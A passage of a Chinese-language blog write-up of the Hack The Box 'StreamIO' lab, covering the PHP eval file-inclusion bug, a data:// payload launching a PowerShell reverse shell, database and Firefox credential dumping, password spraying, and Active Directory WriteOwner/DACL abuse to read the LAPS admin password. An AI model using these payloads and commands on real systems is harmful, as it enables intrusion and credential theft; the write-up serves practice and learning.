,Oliver fd78db29173a5cf701bd69027cb9bf6b ,Michelle b83439b16f844bd6ffe35c02fe21b3c0 ,Gloria 0cfaaaafb559f081df2befbe66686de0 ,Victoria b22abb47a02b52d5dfa27fb0b534f693 ,Alexendra 1c2b3d8270321140e5153f6637d3ee53 ,Baxter 22ee218331afd081b0dcd8115284bae3 ,Clara ef8f3d30a856cf166fb8215aca93e9ff ,Barbra 3961548825e3e21df5646cafe11c6c76 ,Lenord ee0b8a0937abd60c2882eacb2f8dc49f ,Austin 0049ac57646627b8d7aeaccf8b6a936f ,Garfield 8097cedd612cc37c29db152b6e9edbd3 ,Juliette 6dcd87740abb64edfa36d170f0d5450d ,Victor bf55e15b119860a6e6b5a164377da719 ,Lucifer 7df45a9e3de3863807c026ba48e55fb3 ,Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 ,Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 ,Robin dc332fb5576e9631c9dae83f194f8e70 ,Stan 384463526d288edcc95fc3701e523bc7 ,yoshihide b779ba15cedfd22a023c4d8bcf5f2332 ,admin 665a50ac9eaa781e4f7f04199db97a11 </span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;br&gt;&lt;hr&gt;&lt;br&gt;</span></span><br><span class="line"><span class="meta">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=&quot;include&quot; hidden&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">if(isset($_POST[&#x27;include&#x27;]))</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">if($_POST[&#x27;include&#x27;] !== &quot;index.php&quot; )</span></span><br><span class="line"><span class="meta">eval(file_get_contents($_POST[&#x27;include&#x27;]));</span></span><br><span class="line"><span class="meta">else</span></span><br><span class="line"><span class="meta">echo(&quot; ---- ERROR ---- &quot;);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>master.php中包含了一部分账号密码，不过和我们<code>watch.streamio.htb</code>获取到的重合了，但是可以看到他这里有个包含执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>那有两种打法，一个是伪协议，另一个是起一个服务写个shell.php给它获取执行</p>
<p>这里我用的第一种，确认能运行</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-27.png" alt="alt text"></p>
<p>替换payload为revshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include=data://text/plain,echo `powershell -e ...`;</span><br></pre></td></tr></table></figure>

<p>接到shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lnvp 10086</span><br><span class="line">listening on [any] 10086 ...</span><br><span class="line">connect to [10.10.16.10] from (UNKNOWN) [10.10.11.158] 49998</span><br><span class="line">whoami</span><br><span class="line">streamio\yoshihide</span><br><span class="line">PS C:\inetpub\streamio.htb\admin&gt; </span><br></pre></td></tr></table></figure>

<p>然后去翻它web的配置信息</p>
<p>web文件中有看到奇怪的加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">           &lt;add name=&quot;DefaultAppPool&quot; /&gt;                                                                                                                                                                                                                     </span><br><span class="line">            &lt;add name=&quot;.NET v4.5 Classic&quot; managedRuntimeVersion=&quot;v4.0&quot; managedPipelineMode=&quot;Classic&quot; /&gt;                                                                                                                                                       </span><br><span class="line">            &lt;add name=&quot;.NET v4.5&quot; managedRuntimeVersion=&quot;v4.0&quot; /&gt;                                                                                                                                                                                             </span><br><span class="line">            &lt;add name=&quot;streamio.htb&quot; autoStart=&quot;true&quot;&gt;                                                                                                                                                                                                        </span><br><span class="line">                &lt;processModel userName=&quot;streamio.htb\yoshihide&quot; password=&quot;[enc:IISWASOnlyCngProvider:NawQF2cL5U1N94S5BmKZCbLY/ubKCuwuvmS42IcSEgmr7PhsAcZ1Ri/xZAyXdsKTwUYue3VPHqhYQ68/jiMkBn7UBXogzotmn6PY/ForGtMDT9vTcfSzRuPZCVeAv4y8:enc]&quot; /&gt;                </span><br><span class="line">            &lt;/add&gt;                                                                                                                                                                                                                                            </span><br><span class="line">            &lt;add name=&quot;watch.streamio.htb&quot; /&gt;                                                                                                                                                                                                                 </span><br><span class="line">            &lt;applicationPoolDefaults managedRuntimeVersion=&quot;v4.0&quot;&gt;                                                                                                                                                                                                            &lt;processModel identityType=&quot;SpecificUser&quot; userName=&quot;streamio.htb\yoshihide&quot; password=&quot;[enc:IISWASOnlyCngProvider:nRBJ+OjC/BRDIdYMYQRpXLLY/ubKCuwuvmS42IcSEgmr7PhsAcZ1Ri/xZAyXdsKTFxfZC9cUmOu/798NwCzi+KH1LWmAQ6eDcmka/+M41hMFLFK5SiIsvrgBemU9d</span><br><span class="line">TAf:enc]&quot; /&gt;      </span><br></pre></td></tr></table></figure>

<p>找到了这篇文章</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical-blog/network-pentesting/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/">https://www.netspi.com/blog/technical-blog/network-pentesting/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/</a></p>
</blockquote>
<p>尝试<code>appcmd list apppools</code>，但是什么都没列出</p>
<p>不过还有个刚刚web上注入时候没有权限查看的<code>streamio_backup</code>库，刚刚我们拿到了db_admin的密码可以尝试翻查，这里他本地有<code>sqlcmd</code>可以直接查</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\inetpub&gt; sqlcmd <span class="literal">-S</span> localhost <span class="literal">-U</span> <span class="string">&#x27;db_admin&#x27;</span> <span class="literal">-P</span> <span class="string">&#x27;B1@hx31234567890&#x27;</span> <span class="literal">-Q</span> <span class="string">&quot;SELECT name FROM master.sys.databases;&quot;</span></span><br><span class="line">name</span><br><span class="line"><span class="literal">--------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line">STREAMIO</span><br><span class="line">streamio_backup</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span> rows affected)</span><br></pre></td></tr></table></figure>

<p>查一下streamio_backup下的表，能看出来他确实是和<code>streamio</code>一毛一样的结构，确实是备份库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\inetpub&gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -Q &quot;use streamio_backup;select name from sys.tables;&quot;</span><br><span class="line">Changed database context to &#x27;streamio_backup&#x27;.</span><br><span class="line">name</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">movies</span><br><span class="line">users</span><br></pre></td></tr></table></figure>

<p>再一次查他的<code>users</code>信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd <span class="literal">-S</span> localhost <span class="literal">-U</span> db_admin <span class="literal">-P</span> B1@hx31234567890 <span class="literal">-Q</span> <span class="string">&quot;use streamio_backup;select * from users&quot;</span></span><br><span class="line">Changed database context to <span class="string">&#x27;streamio_backup&#x27;</span>.</span><br><span class="line">id          username                                           password                                          </span><br><span class="line"><span class="literal">-----------</span> <span class="literal">--------------------------------------------------</span> <span class="literal">--------------------------------------------------</span></span><br><span class="line">          <span class="number">1</span> nikk37                                             <span class="number">389</span>d14cb8e4e9b94b137deb1caf0612a</span><br><span class="line">          <span class="number">2</span> yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332</span><br><span class="line">          <span class="number">3</span> James                                              c660060492d9edcaa8332d89c99c9239</span><br><span class="line">          <span class="number">4</span> Theodore                                           <span class="number">925</span>e5408ecb67aea449373d668b7359e</span><br><span class="line">          <span class="number">5</span> Samantha                                           <span class="number">083</span>ffae904143c4796e464dac33c1f7d</span><br><span class="line">          <span class="number">6</span> Lauren                                             <span class="number">08344</span>b85b329d7efd611b7a7743e8a09</span><br><span class="line">          <span class="number">7</span> William                                            d62be0dc82071bccc1322d64ec5b6c51</span><br><span class="line">          <span class="number">8</span> Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span> rows affected)</span><br></pre></td></tr></table></figure>

<p>这次比对了下，当前库和backup库差出来个nikk37用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">─$ diff <span class="built_in">users</span> new_users -f</span><br><span class="line">d1 13</span><br><span class="line">d15 20</span><br><span class="line">c22 31</span><br><span class="line">nikk37</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>hashcat跑出来nikk37的密码<code>get_dem_girls2@yahoo.com</code>，撞一下先</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.11.158 -u new_user -p new_pass --no-bruteforce --continue-on-success</span><br><span class="line">SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:<span class="comment">##123a8j8w5123## STATUS_LOGON_FAILURE </span></span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>

<p>也就只有这一个<code>nikk37</code></p>
<p>登陆后get user</p>
<h1 id="to-Root"><a href="#to-Root" class="headerlink" title="to Root"></a>to Root</h1><p>这里搜点时候发现这个用户的<code>roaming</code>目录下存了<code>firefox</code>的信息，然后跑winpeas时候也有显示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Info: if no credentials were listed, you might need to close the browser and try again.                                                                                                                        </span><br><span class="line">                                                                                                         </span><br><span class="line">ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs                                                                     </span><br><span class="line">È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history     </span><br><span class="line">    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db                                                                                   </span><br><span class="line">È Run SharpWeb (https://github.com/djhohnstein/SharpWeb) </span><br></pre></td></tr></table></figure>

<p>不知道为啥它推荐的<code>sharpweb</code>跑的时候会崩掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\nikk37\Documents&gt; .\SharpWeb.exe edge firefox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=== Checking for Firefox (Current User) ===</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=== Checking Windows Vaults ===</span><br><span class="line"></span><br><span class="line">SharpWeb.exe : </span><br><span class="line">    + CategoryInfo          : NotSpecified: (:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">Unhandled Exception: System.Exception: [ERROR] Unable to enumerate vaults. Error (0x1061)   at SharpEdge.Edge.GetLogins()   at SharpWeb.Program.Main(String[] args)</span><br></pre></td></tr></table></figure>

<p>这里切换<a target="_blank" rel="noopener" href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
<p>通过下文得知，只需要<code>cert9.db  key4.db  logins.json</code>这三个文件下到本地，即可解出保存的密码</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://henkel-security.com/2019/12/malware-phishing-stealing-firefox-login-information/">https://henkel-security.com/2019/12/malware-phishing-stealing-firefox-login-information/</a></p>
</blockquote>
<p>这里我将三个文件传到本地的一个目录下，进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 firefox_decrypt.py ~/Desktop/htb/StreamIO/brow_cache/. -v</span><br><span class="line">2024-12-30 12:35:44,525 - INFO - Running firefox_decrypt version: 1.1.1-5-g8a5fdeb</span><br><span class="line">2024-12-30 12:35:44,528 - WARNING - profile.ini not found in /home/fonllge/Desktop/htb/StreamIO/brow_cache/.</span><br><span class="line">2024-12-30 12:35:44,528 - WARNING - Continuing and assuming &#x27;/home/fonllge/Desktop/htb/StreamIO/brow_cache/.&#x27; is a profile location</span><br><span class="line">2024-12-30 12:35:44,531 - INFO - No Primary Password found - no authentication needed</span><br><span class="line">2024-12-30 12:35:44,531 - INFO - Using /home/fonllge/Desktop/htb/StreamIO/brow_cache/./logins.json for credentials.</span><br><span class="line">2024-12-30 12:35:44,531 - INFO - Decrypting credentials</span><br><span class="line"></span><br><span class="line">Website:   https://slack.streamio.htb</span><br><span class="line">Username: &#x27;admin&#x27;</span><br><span class="line">Password: &#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span><br><span class="line"></span><br><span class="line">Website:   https://slack.streamio.htb</span><br><span class="line">Username: &#x27;nikk37&#x27;</span><br><span class="line">Password: &#x27;n1kk1sd0p3t00:)&#x27;</span><br><span class="line"></span><br><span class="line">Website:   https://slack.streamio.htb</span><br><span class="line">Username: &#x27;yoshihide&#x27;</span><br><span class="line">Password: &#x27;paddpadd@12&#x27;</span><br><span class="line"></span><br><span class="line">Website:   https://slack.streamio.htb</span><br><span class="line">Username: &#x27;JDgodd&#x27;</span><br><span class="line">Password: &#x27;password@12&#x27;</span><br></pre></td></tr></table></figure>

<p>其中得到四个密码，rpc导出所有域用户，挨个撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &#x27;nikk37%get_dem_girls2@yahoo.com&#x27; 10.10.11.158 -c &#x27;querydispinfo&#x27; |awk &#x27;&#123;print $8&#125;&#x27; &gt; all_user</span><br></pre></td></tr></table></figure>

<p>只跑出一个<code>jdgodd</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ kerbrute passwordspray ../all_user &#x27;JDg0dd1s@d0p3cr3@t0r&#x27; --dc 10.10.11.158 -d streamio.htb           </span><br><span class="line">                                                    </span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____                                                               </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/                                                              </span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                         </span><br><span class="line">                                                    </span><br><span class="line">Version: v1.0.3 (9dad6e1) - 12/31/24 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2024/12/31 15:14:17 &gt;  Using KDC(s):                                                                     </span><br><span class="line">2024/12/31 15:14:17 &gt;   10.10.11.158:88</span><br><span class="line">                                                                                                         </span><br><span class="line">2024/12/31 15:14:20 &gt;  [+] VALID LOGIN:  JDgodd@streamio.htb:JDg0dd1s@d0p3cr3@t0r            </span><br><span class="line">2024/12/31 15:14:20 &gt;  Done! Tested 7 logins (1 successes) in 2.831 seconds</span><br></pre></td></tr></table></figure>

<p>狗图里可以看到jdgodd这个用户对<code>core staff</code>组有<code>Write Owner</code>权限</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-28.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(LDAP)-[DC.streamIO.htb]-[streamIO\JDgodd]                                                                                                                                                                         </span><br><span class="line">PV &gt; Get-DomainObjectAcl -Identity &#x27;core staff&#x27;                                                                                                                                                                    </span><br><span class="line">.....                                           </span><br><span class="line">ObjectDN                    : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb                                  </span><br><span class="line">ObjectSID                   : S-1-5-21-1470860369-1569627196-4264678630-1108                             </span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE                                                         </span><br><span class="line">ACEFlags                    : None</span><br><span class="line">ActiveDirectoryRights       : WriteOwner                                                                 </span><br><span class="line">AccessMask                  : 0x80000               </span><br><span class="line">InheritanceType             : None                                                                       </span><br><span class="line">SecurityIdentifier          : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104)</span><br></pre></td></tr></table></figure>

<p>这里是我感觉writeOwner权限讲的比较好的帖子，说白了，就是有这个权限的用户允许修改组的onwer</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/">https://www.hackingarticles.in/abusing-ad-dacl-writeowner/</a></p>
</blockquote>
<p>首先利用<code>WriteOnwer</code>权限，修改组的所有者为<code>jdgodd</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-owneredit -dc-ip 10.10.11.158  -new-owner jdgodd -target <span class="string">&#x27;core staff&#x27;</span> -action write streamio.htb/jdgodd:<span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-1470860369-1569627196-4264678630-1104</span><br><span class="line">[*] - sAMAccountName: JDgodd</span><br><span class="line">[*] - distinguishedName: CN=JDgodd,CN=Users,DC=streamIO,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br></pre></td></tr></table></figure>

<p>而后再修改对于<code>core staff</code>组的权限为<code>FullControl</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-dacledit -action write -rights FullControl -principal jdgodd -target &#x27;core staff&#x27; -dc-ip 10.10.11.158 streamio.htb/jdgodd:&#x27;JDg0dd1s@d0p3cr3@t0r&#x27; </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20241231-154848.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure>

<p>此时再查看<code>core staff</code>的acl已经多了<code>jdgodd</code>的完全控制权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectDN                    : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb                                  </span><br><span class="line">ObjectSID                   : S-1-5-21-1470860369-1569627196-4264678630-1108                             </span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE                                                         </span><br><span class="line">ACEFlags                    : None                                                                       </span><br><span class="line">ActiveDirectoryRights       : WriteOwner                                                                 </span><br><span class="line">AccessMask                  : 0x80000                                                                    </span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104)                    </span><br><span class="line"></span><br><span class="line">ObjectDN                    : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb                                  </span><br><span class="line">ObjectSID                   : S-1-5-21-1470860369-1569627196-4264678630-1108                         </span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE</span><br><span class="line">ACEFlags                    : None                                                                       </span><br><span class="line">ActiveDirectoryRights       : FullControl     </span><br><span class="line">AccessMask                  : 0xf01ff</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104) </span><br></pre></td></tr></table></figure>

<p>也可以用<code>bloodyad</code>来做<code>Fullcontrol</code>，powerview也可以，看个人喜好</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 ~/tools/wintools/bloodyAD/bloodyAD.py  --dc-ip 10.10.11.158 -d streamio.htb --host dc.streamio.htb -u JDgodd -p <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> add genericAll <span class="string">&#x27;core staff&#x27;</span> <span class="string">&#x27;jdgodd&#x27;</span></span><br><span class="line">[+] jdgodd has now GenericAll on core staff</span><br></pre></td></tr></table></figure>

<p>然后把当前<code>jdgodd</code>加到<code>core staff</code>组里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 ~/tools/wintools/bloodyAD/bloodyAD.py  --dc-ip 10.10.11.158 -d streamio.htb --host dc.streamio.htb -u JDgodd -p <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> add groupMember <span class="string">&#x27;core staff&#x27;</span> <span class="string">&#x27;jdgodd&#x27;</span>  </span><br><span class="line">[+] jdgodd added to core staff</span><br></pre></td></tr></table></figure>

<p>再看一下权限，有<code>ReadLapsPassword</code>，<a target="_blank" rel="noopener" href="https://flowerwitch.github.io/2024/12/31/Tracks-AD-Timelapse/">timelapse</a>那台机器有讲过<code>laps</code>，这里不赘述。</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-29.png" alt="alt text"></p>
<p>直接读<code>dc$</code>的<code>ms-mcs-AdmPwd</code>属性</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 ~/tools/wintools/bloodyAD/bloodyAD.py  --dc-ip 10.10.11.158 -d streamio.htb --host dc.streamio.htb -u JDgodd -p <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> get object <span class="string">&#x27;dc$&#x27;</span> --attr <span class="string">&#x27;ms-mcs-AdmPwd&#x27;</span></span><br><span class="line"></span><br><span class="line">distinguishedName: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb</span><br><span class="line">ms-Mcs-AdmPwd: U0)of2g.20oZt<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>winrm get Root</p>
<hr>
<blockquote>
<p>感觉这台靶机web部分有意思，<code>watch</code>sql注入拿密码又回到主域名再到文件包含伪协议读php拿shell，遇到参数fuzz后面还有浏览器凭证解密，好玩。</p>
</blockquote>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/01/04/Tracks-AD-Return/"
      title="Tracks-AD-Return"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Tracks-AD-Return
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/31/Tracks-AD-Escape/"
      title="Tracks-AD-Escape"
     >

    <p class="title-text">
      
        Tracks-AD-Escape
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


